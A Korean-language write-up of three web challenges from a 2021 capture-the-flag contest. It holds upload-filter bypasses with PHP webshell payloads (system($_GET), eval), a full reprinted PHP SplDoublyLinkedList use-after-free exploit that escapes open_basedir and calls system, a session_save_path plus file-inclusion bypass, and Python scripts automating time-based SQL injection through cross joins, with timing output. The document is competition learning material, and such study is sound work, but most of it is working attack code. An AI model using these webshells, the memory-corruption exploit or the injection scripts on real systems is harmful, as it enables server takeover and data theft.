## Summary

이번 주말에는 약 2달만에 풀타임으로 아는 분들과 CTF를 참여했습니다. 공부를 2~3달 동안 안 해서 그런지 감도 안 잡히고 힘들었습니다.

---
### (Web) Imageflare [100 pts]

> Imageflare 문제는 파일 업로드 취약점을 이용해 웹쉘을 업로드 한 뒤에 RCE를 이용해 플래그를 획득하는 문제입니다.

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Imageflare/1.png?raw=true)

일단 문제를 보면 위와 같이 파일 업로드 기능이 주어지고, 파일 업로드를 할 때 마다 Pow 값을 맞춰줘야 한다.

```python
import hashlib
import string
import random
import uuid
import sys

for i in range(10000000) :
    input = uuid.uuid4()
    input = str(input)
    sha_1 = hashlib.sha1()
    sha_1.update(input.encode('utf-8'))
    inputsha = sha_1.hexdigest()
    inputsha5 = inputsha[:5]
    pow = sys.argv[1]
    if inputsha5 == pow :
        print("[*] " + input)
        break
print("[*] end..")
```

Pow 값은 위 페이로드로 쉽게 획득할 수 있습니다. ( 이 작업은 매우 번거롭다 XD )

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Imageflare/2.png?raw=true)

```php
<?= 7*7 ?>
```

php 파일을 업로드 해보니 필터링에 걸리는 것을 확인할 수 있었다. 그래서 여러번 파일 업로드를 하며 확인해본 결과 시그니처 값과 `<?php >` 문자열 존재만 확인하는 거 같았습니다. 그래서 그냥 아무 이미지 파일을 다운로드 하고, 이미지 헤더 내에 위 페이로드를 넣고, 파일 명은 `<filename>.php`로 업로드 하여 익스플로잇을 진행했습니다.

파일 업로드 후에 파일 명을 클릭하면 파일을 읽는 것이 아닌 다운로드가 되도록 구현되어 있었습니다. 여기서 저는 약간의 게싱을 이용해서 업로드 되는 디렉터리를 알아냈습니다. (/uploads/<filename>)

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Imageflare/4.png?raw=true)

아까 위에서 올린 php 파일로 접근을 해보니 `7*7`가 그대로 실행 되어 출력되는 것을 확인할 수 있었습니다.

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Imageflare/7.png?raw=true)

```php
<?= echo system($_GET['c']); ?>
```

이번에는 위와 같이 이미지 헤더 내에 웹쉘 페이로드를 넣은 후에 업로드하고, 쉘 명령어를 실행해보니 잘 되는 것을 볼 수 있었고, 이를 이용해 플래그를 획득했습니다.

> FLAG{ce9f5efd2c90c3f98fc61fcaf608f842}

---
### (Web) Mudbox [290 pts]

> Mudbox 문제는  session_save_path()를 이용한 open_basedir 우회 기법 또는 UAF Sandbox Escape를 이용해 open_basedir 옵션을 우회하고, RCE 하는 문제 입니다. 

저는 ini_set(), chdir() 함수로 ini_set() 함수로 open_basedir 옵션을 우회하려고 밤을 새면서 시도 했는데, ini_set()을 이용해서 open_basedir을 전역에서 설정해주어도 ㅈㄴ 설정이 아예 안 됐습니다. 하지만 저는 이 방법을 고집하고, 계속 시도 하였지만 php.ini 설정 때문인지 이년이 끝까지 말을 안 듣더라구요 :)

결국 대회 끝나고 지인들한테 물어보니 첫 번째는 `session_save_path()`를 이용해서  open_basedir 우회하기 위해 `plugin/` 디렉터리에 웹쉘 올리고, LFI를 이용해서 해당 파일을 실행 시키는 방식이고, 두 번째는 잘 알려진 UAF Sandbox Escape 공격을 하는 것 입니다.

저도 대회때 UAF 공격을 한 번 시도 해보긴 했는데, 파일 크기 때문에 UAF POC 파일을 업로드 하지 못 해서, 공격을 못 했는데, 지금 생각해보면 그냥 `<?= eval($_GET['cmd']); ?>`로 파일을 올리고, cmd 변수에 UAF Payload를 그냥 넘겨주면 됐었습니다.

또한 CCE 2020에서 nomorephp라는 문제와 싱크로율 100 ;; 그냥 ini_set()만 고집 안 했으면 풀었을 건데 아쉽네요.

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Mudbox/1.png?raw=true)

문제에서는 위와 같이 파일 업로드 기능을 제공하고 있고, php, phar, htm이 들어간 확장자는 모두 필터링에 걸리는데, pht 확장자를 이용해서 우회할 수 있습니다. 

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Mudbox/2.png?raw=true)

```php
<?php
    eval($_GET['code']);
    show_source(__FILE__);
?>
```
그래서 일단 위 페이로드를 pht 확장자로 업로드 해주었습니다.

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Mudbox/3.png?raw=true)

업로드한 파일을 읽어 보니 php로 잘 인식하는 것을 확인 할 수 있습니다.

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Mudbox/rce.png?raw=true)

code 값으로 `phpinfo();`를 넘겨ㅡ주니 실행 또한 잘 되는 것을 확인 할 수 있습니다.

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,getenv,putenv
```
`phpinfo();`에서 disable_functions 설정을 확인 해보니 위와 같이 여러 함수들이 비활성화 되어 있는 것을 확인 할 수 있습니다.

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Mudbox/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-12%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%205.45.14.png?raw=true)

그리고 혹시나 해서 `open_basedir` 설정도 확인 해보니 위와 같이 `/tmp:/var/www/html/data` 설정 되어 있는 것을 확인 했습니다. 플래그는 현재 `/flag`에 있습니다. 또한 우리가 업로드 하는 웹쉘도 `data/` 하위에 생성이 되기 때문에 `data/` 디렉터리에서 현재 경로 및 하위 파일들만 건들 수 있습니다. 

그래서 open_basedir을 우회해서 최상위 디렉터리에 있는 `/flag`를 읽어야 합니다.

open_basedir을 우회하는 첫 번째 방식은 잘 알려진 UAF Sandbox Escape를 이용하는 것 입니다.

```php
<?php
#
# PHP SplDoublyLinkedList::offsetUnset UAF
# Charles Fol (@cfreal_)
# 2020-08-07
# PHP is vulnerable from 5.3 to 8.0 alpha
# This exploit only targets PHP7+.
#
# SplDoublyLinkedList is a doubly-linked list (DLL) which supports iteration.
# Said iteration is done by keeping a pointer to the "current" DLL element.
# You can then call next() or prev() to make the DLL point to another element.
# When you delete an element of the DLL, PHP will remove the element from the
# DLL, then destroy the zval, and finally clear the current ptr if it points
# to the element. Therefore, when the zval is destroyed, current is still
# pointing to the associated element, even if it was removed from the list.
# This allows for an easy UAF, because you can call $dll->next() or
# $dll->prev() in the zval's destructor.
#
#


define('NB_DANGLING', 200);
define('SIZE_ELEM_STR', 40 - 24 - 1);
define('STR_MARKER', 0xcf5ea1);

function i2s(&$s, $p, $i, $x=8)
{
    for($j=0;$j<$x;$j++)
    {
        $s[$p+$j] = chr($i & 0xff);
        $i >>= 8;
    }
}


function s2i(&$s, $p, $x=8)
{
    $i = 0;

    for($j=$x-1;$j>=0;$j--)
    {
        $i <<= 8;
        $i |= ord($s[$p+$j]);
    }

    return $i;
}


class UAFTrigger
{
    function __destruct()
    {
        global $dlls, $strs, $rw_dll, $fake_dll_element, $leaked_str_offsets;

        #"print('UAF __destruct: ' . "\n");
        $dlls[NB_DANGLING]->offsetUnset(0);

        # At this point every $dll->current points to the same freed chunk. We allocate
        # that chunk with a string, and fill the zval part
        $fake_dll_element = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
        i2s($fake_dll_element, 0x00, 0x12345678); # ptr
        i2s($fake_dll_element, 0x08, 0x00000004, 7); # type + other stuff

        # Each of these dlls current->next pointers point to the same location,
        # the string we allocated. When calling next(), our fake element becomes
        # the current value, and as such its rc is incremented. Since rc is at
        # the same place as zend_string.len, the length of the string gets bigger,
        # allowing to R/W any part of the following memory
        for($i = 0; $i <= NB_DANGLING; $i++)
            $dlls[$i]->next();

        if(strlen($fake_dll_element) <= SIZE_ELEM_STR)
            die('Exploit failed: fake_dll_element did not increase in size');

        $leaked_str_offsets = [];
        $leaked_str_zval = [];

        # In the memory after our fake element, that we can now read and write,
        # there are lots of zend_string chunks that we allocated. We keep three,
        # and we keep track of their offsets.
        for($offset = SIZE_ELEM_STR + 1; $offset <= strlen($fake_dll_element) - 40; $offset += 40)
        {
            # If we find a string marker, pull it from the string list
            if(s2i($fake_dll_element, $offset + 0x18) == STR_MARKER)
            {
                $leaked_str_offsets[] = $offset;
                $leaked_str_zval[] = $strs[s2i($fake_dll_element, $offset + 0x20)];
                if(count($leaked_str_zval) == 3)
                    break;
            }
        }

        if(count($leaked_str_zval) != 3)
            die('Exploit failed: unable to leak three zend_strings');

        # free the strings, except the three we need
        $strs = null;

        # Leak adress of first chunk
        unset($leaked_str_zval[0]);
        unset($leaked_str_zval[1]);
        unset($leaked_str_zval[2]);
        $first_chunk_addr = s2i($fake_dll_element, $leaked_str_offsets[1]);

        # At this point we have 3 freed chunks of size 40, which we can read/write,
        # and we know their address.
        print('Address of first RW chunk: 0x' . dechex($first_chunk_addr) . "\n");

        # In the third one, we will allocate a DLL element which points to a zend_array
        $rw_dll->push([3]);
        $array_addr = s2i($fake_dll_element, $leaked_str_offsets[2] + 0x18);
        # Change the zval type from zend_object to zend_string
        i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);
        if(gettype($rw_dll[0]) != 'string')
            die('Exploit failed: Unable to change zend_array to zend_string');

        # We can now read anything: if we want to read 0x11223300, we make zend_string*
        # point to 0x11223300-0x10, and read its size using strlen()

        # Read zend_array->pDestructor
        $zval_ptr_dtor_addr = read($array_addr + 0x30);

        print('Leaked zval_ptr_dtor address: 0x' . dechex($zval_ptr_dtor_addr) . "\n");

        # Use it to find zif_system
        $system_addr = get_system_address($zval_ptr_dtor_addr);
        print('Got PHP_FUNCTION(system): 0x' . dechex($system_addr) . "\n");

        # In the second freed block, we create a closure and copy the zend_closure struct
        # to a string
        $rw_dll->push(function ($x) {});
        $closure_addr = s2i($fake_dll_element, $leaked_str_offsets[1] + 0x18);
        $data = str_shuffle(str_repeat('A', 0x200));

        for($i = 0; $i < 0x138; $i += 8)
        {
            i2s($data, $i, read($closure_addr + $i));
        }

        # Change internal func type and pointer to make the closure execute system instead
        i2s($data, 0x38, 1, 4);
        i2s($data, 0x68, $system_addr);

        # Push our string, which contains a fake zend_closure, in the last freed chunk that
        # we control, and make the second zval point to it.
        $rw_dll->push($data);
        $fake_zend_closure = s2i($fake_dll_element, $leaked_str_offsets[0] + 0x18) + 24;
        i2s($fake_dll_element, $leaked_str_offsets[1] + 0x18, $fake_zend_closure);
        print('Replaced zend_closure by the fake one: 0x' . dechex($fake_zend_closure) . "\n");

        # Calling it now

        print('Running system("cat /flag");' . "\n");
        $rw_dll[1]('cat /flag');

        print_r('DONE'."\n");
    }
}

class DanglingTrigger
{
    function __construct($i)
    {
        $this->i = $i;
    }

    function __destruct()
    {
        global $dlls;
        #D print('__destruct: ' . $this->i . "\n");
        $dlls[$this->i]->offsetUnset(0);
        $dlls[$this->i+1]->push(123);
        $dlls[$this->i+1]->offsetUnset(0);
    }
}

class SystemExecutor extends ArrayObject
{
    function offsetGet($x)
    {
        parent::offsetGet($x);
    }
}

/**
 * Reads an arbitrary address by changing a zval to point to the address minus 0x10,
 * and setting its type to zend_string, so that zend_string->len points to the value
 * we want to read.
 */
function read($addr, $s=8)
{
    global $fake_dll_element, $leaked_str_offsets, $rw_dll;

    i2s($fake_dll_element, $leaked_str_offsets[2] + 0x18, $addr - 0x10);
    i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);

    $value = strlen($rw_dll[0]);

    if($s != 8)
        $value &= (1 << ($s << 3)) - 1;

    return $value;
}

function get_binary_base($binary_leak)
{
    $base = 0;
    $start = $binary_leak & 0xfffffffffffff000;
    for($i = 0; $i < 0x1000; $i++)
    {
        $addr = $start - 0x1000 * $i;
        $leak = read($addr, 7);
        # ELF header
        if($leak == 0x10102464c457f)
            return $addr;
    }
    # We'll crash before this but it's clearer this way
    die('Exploit failed: Unable to find ELF header');
}

function parse_elf($base)
{
    $e_type = read($base + 0x10, 2);

    $e_phoff = read($base + 0x20);
    $e_phentsize = read($base + 0x36, 2);
    $e_phnum = read($base + 0x38, 2);

    for($i = 0; $i < $e_phnum; $i++) {
        $header = $base + $e_phoff + $i * $e_phentsize;
        $p_type  = read($header + 0x00, 4);
        $p_flags = read($header + 0x04, 4);
        $p_vaddr = read($header + 0x10);
        $p_memsz = read($header + 0x28);

        if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
            # handle pie
            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
            $data_size = $p_memsz;
        } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
            $text_size = $p_memsz;
        }
    }

    if(!$data_addr || !$text_size || !$data_size)
        die('Exploit failed: Unable to parse ELF');

    return [$data_addr, $text_size, $data_size];
}

function get_basic_funcs($base, $elf) {
    list($data_addr, $text_size, $data_size) = $elf;
    for($i = 0; $i < $data_size / 8; $i++) {
        $leak = read($data_addr + $i * 8);
        if($leak - $base > 0 && $leak < $data_addr) {
            $deref = read($leak);
            # 'constant' constant check
            if($deref != 0x746e6174736e6f63)
                continue;
        } else continue;

        $leak = read($data_addr + ($i + 4) * 8);
        if($leak - $base > 0 && $leak < $data_addr) {
            $deref = read($leak);
            # 'bin2hex' constant check
            if($deref != 0x786568326e6962)
                continue;
        } else continue;

        return $data_addr + $i * 8;
    }
}

function get_system($basic_funcs)
{
    $addr = $basic_funcs;
    do {
        $f_entry = read($addr);
        $f_name = read($f_entry, 6);

        if($f_name == 0x6d6574737973) { # system
            return read($addr + 8);
        }
        $addr += 0x20;
    } while($f_entry != 0);
    return false;
}

function get_system_address($binary_leak)
{
    $base = get_binary_base($binary_leak);
    print('ELF base: 0x' .dechex($base) . "\n");
    $elf = parse_elf($base);
    $basic_funcs = get_basic_funcs($base, $elf);
    print('Basic functions: 0x' .dechex($basic_funcs) . "\n");
    $zif_system = get_system($basic_funcs);
    return $zif_system;
}

$dlls = [];
$strs = [];
$rw_dll = new SplDoublyLinkedList();


# Create a chain of dangling triggers, which will all in turn
# free current->next, push an element to the next list, and free current
# This will make sure that every current->next points the same memory block,
# which we will UAF.
for($i = 0; $i < NB_DANGLING; $i++)
{
    $dlls[$i] = new SplDoublyLinkedList();
    $dlls[$i]->push(new DanglingTrigger($i));
    $dlls[$i]->rewind();
}

# We want our UAF'd list element to be before two strings, so that we can
# obtain the address of the first string, and increase is size. We then have
# R/W over all memory after the obtained address.
define('NB_STRS', 50);
for($i = 0; $i < NB_STRS; $i++)
{
    $strs[] = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
    i2s($strs[$i], 0, STR_MARKER);
    i2s($strs[$i], 8, $i, 7);
}

# Free one string in the middle, ...
$strs[NB_STRS - 20] = 123;
# ... and put the to-be-UAF'd list element instead.
$dlls[0]->push(0);

# Setup the last DLlist, which will exploit the UAF
$dlls[NB_DANGLING] = new SplDoublyLinkedList();
$dlls[NB_DANGLING]->push(new UAFTrigger());
$dlls[NB_DANGLING]->rewind();

# Trigger the bug on the first list
$dlls[0]->offsetUnset(0);
die();
```

```python
import requests

data = {
    'payload': open('uaf.php').read().replace('<?php', '')
}

response = requests.post("http://3.38.109.135:28344/data/bf233c59229bbbbe50aa44971fbb17c2/40977f3b892bcbc3edd5fd4f1d3abe38.pht?code=eval($_POST['payload']);", data=data)
print(response.text)
```

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Mudbox/flag.png?raw=true)

위 poc 코드를 실행 시켜주면 UAF Sandbox Escape 공격으로 플래그를 읽어오는 것을 볼 수 있습니다.

---
```php
echo session_save_path()."<br>";
mkdir("a");
mkdir("a/b");
chdir("a/b/");
session_save_path("../../plugin");
chdir("../..");
session_start();
$_SESSION['test']="<?php include(\"/flag\"); ?>";
```

두 번째 , open_basedir 우회하는 방식은 `session_save_path()` 함수를 이용해서 세션 파일을 원하는 곳에 생성 시켜 우회하는 방식입니다. 일단 위 페이로드를 이용해서 'plugin/' 디렉터리에 세션 파일로 웹쉘을 생성을 합니다. 

```php
<?php

$p = $_GET["p"] ?? "about";

if(preg_match("/[^A-Za-z0-9\-_]/", $p))
    $p = "about";

include "./$p";
```
`/plugin`에 인덱스 파일을 보면 입력값에 문자열 및 '-', '\_' 문자열만 포함되어 있어야 하고, include를 이용해서 입력값에 대한 파일을 가져오는 것을 알 수 있습니다. 그렇기 때문에 위에서 올린 세션 파일을 LFI를 이용해 가져와 실행 시키면 플래그를 획득할 수 있습니다. 세션 파일명은 `(sess_phpsessid)` 입니다.

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Mudbox/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-12%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%205.53.30.png?raw=true)

일단 위 코드를 pht 확장자로 업로드 합니다.

![](https://github.com/wjddnjs33/Exploit/blob/main/ctf/2021/White%20Hat%20Contest%202021/Mudbox/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-12%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%205.55.27.png?raw=true)

파일을 실행 하고, LFI 취약점을 이용해 파일을 실행 하니 플래그가 출력되는 것을 볼 수 있습니다.

> FLAG{b4s3dir_i5_n0t_s4fe_h4h4}

---
### (Web) BitTrader [482 pts]

> BitTrader 문제는 join을 이용해서 테이블을 여러개 조인 해 줄 경우 발생하는 슬립 현상을 이용해서 Time Based SQL Injection을 하는 문제 입니다. 

해당 문제는 대회 당시에 Mudbox와 다르게 그냥 감 자체를 잡지 못 했고, 공부용으로도 너무 좋은 문제라서 대회가 끝났지만 계속 풀어보기로 했습니다. 일단 대회 당시에 SQL Injection인 것을 알았지만 어떤 식으로 데이터를 추출해야 하는 지 알지 못 했습니다.

![](https://media.discordapp.net/attachments/857916308892418071/887238980481978418/1.png?width=1588&height=1077)

일단 문제 페이지를 보면 위와 같이 비트코인, 이더리움, 리플, 도지 코인의 현재 가격을 출력해주는 것을 확인할 수 있습니다.

![](https://media.discordapp.net/attachments/857916308892418071/887238991072591893/2.png?width=1780&height=1075)

그리고 Trade 버튼을 클릭하면 특정 코인의 가격을 5초 간격으로 나타나는 지표를 확인할 수 있으며, 네트워크 창을 확인 해보면 api(ajax_ticks.php?symbol=btc)로 요청 해서 코인의 현재 가격을 가져 오는 것을 확인할 수 있습니다. 

![](https://media.discordapp.net/attachments/857916308892418071/887238987121577984/3.png?width=1780&height=1075)

`/ajax_ticks.php?symbol=btc`로 접속을 하면 위와 같이 결과 값을 반환하는 것을 확인할 수 있습니다.

![](https://media.discordapp.net/attachments/857916308892418071/887238985599033344/4.png?width=1780&height=1075)

그래서 여기가 SQL Injection 공격 포인트라 생각하고, 여러 페이로드를 보내면서 익스를 시도 하였지만 성공하지 못 했습니다. 일단 대부분에 특수 문자가 막혀 있기 때문에 싱글 쿼터 및 함수 자체를 사용할 수 없었습니다.

```sql
SELECT ~~ FROM price_$symbol limit 0, 10
```
하지만 symbol의 값이 where 절에 들어가는 것이 아닌 위와 같이 테이블 명에 들어가기 때문에 싱글 쿼터를 우회할 필요가 없었으며 익스플로잇은 join을 이용해 테이블 여러개를 조인 시켜 줄 경우에 발생하는 에러 또는 슬립 현상을 이용해 Error/Time Based SQL Injection을 이용해야 했습니다. 저는 슬립 현상을 이용해서 타임어택을 하였지만 효율성은 에러를 이용하는 것이 좋아 보입니다.

![](https://media.discordapp.net/attachments/857916308892418071/887238968624689182/5.png?width=1794&height=209)

```sql
select * from users cross join information_schema.tables cross join information_schema.columns on 1=0;
select * from users cross join information_schema.tables cross join information_schema.columns on 1=1;
```
일단 로컬에서 cross join을 이용해 메타 테이블들을 이어주는 퀴러를 위와 같이 작성 해 테스트를 해보았습니다. 사진을 보면 거짓일 때는, 쿼리 실행이 바로 종료 되지만, 참일 때는 오랜시간 슬립 현상이 발생하는 것을 확인할 수 있었습니다. 

그렇기 때문에 이를 이용해서 Time Based SQL Injection을 이용해 디비 정보를 모두 추출하면 됩니다.

![](https://media.discordapp.net/attachments/857916308892418071/887238988874784768/6.png?width=1794&height=1063)

```sql
btc cross join information_schema.columns cross join information_schema.tables on 1=1
```
그래서 `cross join`을 이용하여 위와 같이 메타 테이블 2개를 엮어주는 쿼리를 전송해주니 약 4초 정도 Sleep이 발생하는 것을 볼 수 있습니다. 이제 이를 이용해서 Time Based SQL Injection을 하면 될 거 같습니다 :) 

```python
import requests
import string

url = "http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns on m.table_name like 0x{}"

leaked = ""
while True:
    for s in string.printable:
        f = url.format((leaked + s + '%').encode().hex())
        r = requests.get(f)
        print(f"C: {s}, T: {r.elapsed}")
```
일단 테이블 명의 첫 글자들을 확인하기 위해 위와 같이 코드를 작성하였습니다. 그리고 문제에서는 테이블/컬럼 명, 레코드 값을 뽑을 때는 두 개의 테이블로는 크기가 부족해서 `statistics`, `processlist` 테이블을 추가로 조인 시켜 주었으며 위와 같이 PoC 코드를 작성해주었습니다.

```
C: 0, T: 0:00:00.040496
C: 1, T: 0:00:00.039568
C: 2, T: 0:00:00.033084
C: 3, T: 0:00:00.054973
C: 4, T: 0:00:00.040466
C: 5, T: 0:00:00.033778
C: 6, T: 0:00:00.036218
C: 7, T: 0:00:00.039113
C: 8, T: 0:00:00.039524
C: 9, T: 0:00:00.043274
C: a, T: 0:00:00.042083
C: b, T: 0:00:00.037688
C: c, T: 0:00:02.985553
C: d, T: 0:00:00.041576
C: e, T: 0:00:03.037683
C: f, T: 0:00:03.260697
C: g, T: 0:00:03.217965
C: h, T: 0:00:00.036901
C: i, T: 0:00:02.984188
C: j, T: 0:00:00.042655
C: k, T: 0:00:01.794134
C: l, T: 0:00:01.048942
C: m, T: 0:00:00.036848
C: n, T: 0:00:00.037003
C: o, T: 0:00:01.728545
C: p, T: 0:00:03.069760
C: q, T: 0:00:00.046779
C: r, T: 0:00:03.427775
C: s, T: 0:00:02.869415
C: t, T: 0:00:02.965769
C: u, T: 0:00:01.839867
C: v, T: 0:00:02.045197
C: w, T: 0:00:00.045391
C: x, T: 0:00:00.038370
C: y, T: 0:00:00.034550
C: z, T: 0:00:00.040592
C: A, T: 0:00:00.038777
C: B, T: 0:00:00.035266
C: C, T: 0:00:02.923604
C: D, T: 0:00:00.043928
C: E, T: 0:00:03.431379
C: F, T: 0:00:03.434538
C: G, T: 0:00:03.437290
C: H, T: 0:00:00.041747
C: I, T: 0:00:02.984453
C: J, T: 0:00:00.044469
C: K, T: 0:00:01.692472
C: L, T: 0:00:00.040697
C: M, T: 0:00:00.034870
C: N, T: 0:00:00.039964
C: O, T: 0:00:01.844985
C: P, T: 0:00:02.975808
C: Q, T: 0:00:00.050623
C: R, T: 0:00:03.314133
C: S, T: 0:00:02.897688
C: T, T: 0:00:03.033871
C: U, T: 0:00:02.356644
C: V, T: 0:00:01.630371
C: W, T: 0:00:00.042096
C: X, T: 0:00:00.042518
C: Y, T: 0:00:00.053940
C: Z, T: 0:00:00.042300
```
코드를 돌려보니 위와 같이 꽤나 정확한 오라클 결과들을 얻을 수 있었고, 위 오라클을 기반으로 테이블 명을 뽑아 보다가 `f`에서 `files`, `flag`라는 테이블이 존재하는 것을 확인하였고, 이를 기반으로 컬럼, 레코드 값을 뽑기로 하였습니다.

```python
import requests
import string
import time

str_list = string.printable.replace('%','').replace('_','')

def execute(s, url, data, Time):
	result = data
	p = 1
	while p == 1:
		start = result
		for s in str_list:
			start_time = time.time()
			requests.get(url.format((result + s + '%').encode().hex()))
			if (time.time() - start_time) > Time:
				result += s
				break
		if start == result:
			p = 0
	return result

if __name__ == '__main__':
	print("[*] Start an exploit")
	print(f"[*] The table name is {execute('fl', 'http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns on m.table_name like 0x{}', 'fl', 1.4)}")
	print(f"[*] The column name is {execute('fl', 'http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns as f on f.column_name like 0x{}', 'fl', 0.1)}")
	print(f"[*] The flag is {execute('fl', 'http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns cross join flag as c on c.flag like 0x{}', 'fl', 1.4)}")
	print("[*] Congratulations for to leak a flag XD")
```

![](https://media.discordapp.net/attachments/857916308892418071/887238985490001930/2021-09-14_4.30.04.png?width=1794&height=753)

PoC 코드를 돌려 주면 위 사진처럼 테이블/컬럼 명 및 플래그 릭에 성공하는 것을 확인할 수 있습니다.

> FLAG : FLAG{d0geg0estom4rs}

---

